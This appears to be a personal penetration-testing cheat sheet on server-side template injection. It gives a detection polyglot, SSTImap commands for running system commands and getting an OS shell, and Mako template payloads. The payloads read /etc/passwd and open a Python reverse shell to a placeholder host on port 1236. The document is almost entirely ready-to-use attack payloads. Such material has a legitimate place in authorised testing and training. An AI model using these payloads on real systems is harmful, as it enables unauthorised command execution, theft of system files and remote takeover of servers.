# SSTI

## Resources
- [payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
- [Hacktricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [SSTImap](https://github.com/vladko312/SSTImap)

## Detection
Insert this and check if there's an error
```
${{<%[%'"}}%\.
```

## SSTImap
### Setup
```bash
git clone https://github.com/vladko312/SSTImap.git; cd SSTImap; pip3 install -r requirements.txt
```
### Usage
#### Detect
```bash
python3 sstimap.py -u http://<host>/index.php?fieldUsedInTemplate=xxx
```
#### Run system commands
```bash
python3 sstimap.py -u http://<host>/index.php?fieldUsedInTemplate=xxx -e Mako -S id
```
#### OS Shell
```bash
python3 sstimap.py -u http://<host>/index.php?fieldUsedInTemplate=xxx -e Mako --os-shell
```

## Engine specific
### Mako
```python
${4+4}
<%import os;x=os.popen('cat /etc/passwd').read()%>${x}
<%from pathlib import Path;x=Path('/etc/passwd').read_text()%>${x}
<%import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",1236));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);%>
```

